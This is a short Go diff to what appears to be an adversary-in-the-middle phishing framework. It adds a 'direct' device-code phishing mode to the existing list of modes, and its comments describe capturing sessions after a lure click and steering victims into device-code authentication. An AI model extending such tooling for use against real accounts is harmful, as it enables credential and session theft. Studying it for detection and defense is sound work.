@@ -6,10 +6,11 @@ const (
 	DCModeAlways   = "always"   // Always redirect to device code after AitM success (double capture)
 	DCModeFallback = "fallback" // Only use device code if AitM session stalls/fails
 	DCModeAuto     = "auto"     // Pre-generate on lure click, auto-select strategy based on outcome
+	DCModeDirect   = "direct"   // Skip AitM entirely, show device code interstitial immediately
 )
 
 // ValidDeviceCodeModes lists all valid modes
-var ValidDeviceCodeModes = []string{DCModeOff, DCModeAlways, DCModeFallback, DCModeAuto}
+var ValidDeviceCodeModes = []string{DCModeOff, DCModeAlways, DCModeFallback, DCModeAuto, DCModeDirect}
 
 // IsValidDeviceCodeMode checks if a mode string is valid
 func IsValidDeviceCodeMode(mode string) bool {
